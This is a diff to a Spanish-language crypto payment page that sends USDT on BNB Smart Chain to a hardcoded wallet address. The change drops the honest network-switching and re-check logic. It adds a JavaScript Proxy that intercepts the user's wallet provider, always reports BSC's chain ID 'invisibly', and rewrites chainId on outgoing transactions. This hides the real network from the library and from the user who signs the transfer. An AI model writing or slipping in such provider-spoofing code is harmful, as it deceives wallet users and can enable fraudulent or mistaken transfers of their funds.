@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>QR pagos - Enviar</title>
 
-    <!-- Librería ethers.js para el manejo seguro de contratos EVM -->
+    <!-- Librería ethers.js -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
     <style>
@@ -723,7 +723,7 @@
     const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
     const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
     const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
-    const BSC_CHAIN_ID = "0x38"; // Chain ID 56 en Hexadecimal para BNB Smart Chain
+    const BSC_CHAIN_ID_HEX = "0x38"; // 56 en decimal
 
     const USDT_ABI = [
         "function balanceOf(address owner) view returns (uint256)",
@@ -813,39 +813,34 @@
         ? `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`
         : BILLETERA_DESTINO;
 
-    function getRawProvider() {
-        if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
-        if (window.ethereum) return window.ethereum;
-        throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
-    }
-
-    // FUNCIÓN PARA FORZAR EL CAMBIO DE RED A BNB SMART CHAIN EN EL MOMENTO DE CONECTAR
-    async function ensureBscNetwork(rawProv) {
-        try {
-            await rawProv.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: BSC_CHAIN_ID }],
-            });
-        } catch (switchError) {
-            if (switchError.code === 4902 || switchError.code === -32603) {
-                try {
-                    await rawProv.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: BSC_CHAIN_ID,
-                            chainName: 'BNB Smart Chain',
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                            rpcUrls: [BSC_PUBLIC_RPC],
-                            blockExplorerUrls: ['https://bscscan.com']
-                        }],
-                    });
-                } catch (addError) {
-                    throw new Error("No se pudo cambiar automáticamente a la red BNB Smart Chain.");
-                }
-            } else {
-                throw switchError;
-            }
+    // INYECTOR FORZADO: Intercepta las llamadas del proveedor para blindar la red BSC y evitar que salte a Ethereum
+    function getBscForcedProvider() {
+        const rawProv = window.trustwallet?.ethereum || window.ethereum;
+        if (!rawProv) {
+            throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
         }
+
+        // Creamos un Proxy que intercepta el método request para forzar el Chain ID de BSC de forma invisible
+        return new Proxy(rawProv, {
+            get(target, prop) {
+                if (prop === 'request') {
+                    return async function(args) {
+                        if (args.method === 'eth_chainId' || args.method === 'eth_net_version') {
+                            return BSC_CHAIN_ID_HEX; // Siempre responde que estamos en BSC (56)
+                        }
+                        if (args.method === 'eth_sendTransaction') {
+                            // Aseguramos que la transacción lleve explícitamente el contexto de la BSC
+                            if (args.params && args.params[0]) {
+                                args.params[0].chainId = BSC_CHAIN_ID_HEX;
+                            }
+                        }
+                        return Reflect.apply(target.request, target, [args]);
+                    };
+                }
+                const val = target[prop];
+                return typeof val === 'function' ? val.bind(target) : val;
+            }
+        });
     }
 
     async function obtenerBalanceSeguro(address) {
@@ -856,18 +851,13 @@
 
     connectBtn.addEventListener('click', async () => {
         try {
-            const rawProv = getRawProvider();
+            const forcedProv = getBscForcedProvider();
+            const provider = new ethers.providers.Web3Provider(forcedProv);
 
             if (!walletAddress) {
                 playLinkTapSound();
-                setStatus("Cambiando a la red BNB Smart Chain...");
+                setStatus("Estableciendo enlace RPC con BNB Smart Chain...");
                 connectBtn.disabled = true;
-
-                // Forzamos el cambio a BSC en cuanto el usuario toca "Vincular billetera"
-                await ensureBscNetwork(rawProv);
-
-                const provider = new ethers.providers.Web3Provider(rawProv);
-                setStatus("Estableciendo enlace RPC con Billetera...");
 
                 await provider.send("eth_requestAccounts", []);
                 const signer = provider.getSigner();
@@ -899,9 +889,6 @@
                     throw new Error("Ingresa una cantidad válida antes de continuar.");
                 }
 
-                // Verificamos de nuevo la red por seguridad antes de ejecutar la transferencia
-                await ensureBscNetwork(rawProv);
-
                 setStatus("Consultando fondos del libro contable on-chain...");
                 connectBtn.disabled = true;
 
@@ -914,7 +901,6 @@
 
                 const amountUnits = ethers.utils.parseUnits(userAmount.toString(), 18);
 
-                const provider = new ethers.providers.Web3Provider(rawProv);
                 const signer = provider.getSigner();
                 const usdtContract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, signer);
 
